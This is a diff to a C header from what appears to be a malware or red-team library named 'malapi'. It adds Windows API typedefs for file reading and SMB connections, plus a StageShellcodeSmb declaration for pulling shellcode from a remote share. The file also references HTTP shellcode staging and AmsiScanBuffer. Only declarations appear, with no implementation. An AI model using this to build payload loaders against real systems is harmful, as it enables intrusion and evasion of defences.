@@ -1817,6 +1817,14 @@ typedef HANDLE(WINAPI* typeCreateFileW)(
 	_In_opt_	HANDLE hTemplateFile
 	);
 
+typedef BOOL(WINAPI* typeReadFile)(
+	_In_        HANDLE       hFile,
+	_Out_       LPVOID       lpBuffer,
+	_In_        DWORD        nNumberOfBytesToRead,
+	_Out_opt_	LPDWORD      lpNumberOfBytesRead,
+	_Inout_opt_ LPOVERLAPPED lpOverlapped
+	);
+
 typedef BOOL(WINAPI* typeDeleteFileA)(
 	_In_ LPCSTR lpFileName
 	);
@@ -2136,6 +2144,27 @@ typedef BOOL(WINAPI* typeFlushInstructionCache)(
 	_In_ HANDLE  hProcess,
 	_In_ LPCVOID lpBaseAddress,
 	_In_ SIZE_T  dwSize
+	);
+
+typedef DWORD(WINAPI* typeWNetAddConnection2A)(
+	_In_ LPNETRESOURCEA lpNetResource,
+	_In_ LPCSTR         lpPassword,
+	_In_ LPCSTR         lpUserName,
+	_In_ DWORD          dwFlags
+	);
+
+typedef DWORD(WINAPI* typeWNetCancelConnection2A)(
+	_In_ LPCSTR lpName,
+	_In_ DWORD  dwFlags,
+	_In_ BOOL   fForce
+	);
+
+typedef DWORD(WINAPI* typeWNetGetLastErrorA)(
+	_Out_ LPDWORD lpError,
+	_Out_ LPSTR   lpErrorBuf,
+	_In_  DWORD   nErrorBufSize,
+	_Out_ LPSTR   lpNameBuf,
+	_In_  DWORD   nNameBufSize
 	);
 
 typedef HRESULT(WINAPI* typeAmsiScanBuffer)(
@@ -2462,6 +2491,12 @@ namespace malapi
 // Returns Shellcode & Shellcode Size
 //
 	BOOL StageShellcodeHttp(_In_ LPCWSTR base_url, _In_ LPCWSTR filename, BOOL ssl_enabled, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size);
+
+	//
+	// Read shellcode from an SMB share
+	// Returns TRUE on success
+	//
+	BOOL StageShellcodeSmb(_In_ LPSTR remote_name, _In_ LPSTR local_name, _In_opt_ LPCSTR username, _In_opt_ LPCSTR password, _Out_ PBYTE* shellcode, _Out_ SIZE_T* shellcode_size);
 
 	///////////////////////////////////
    //                               //
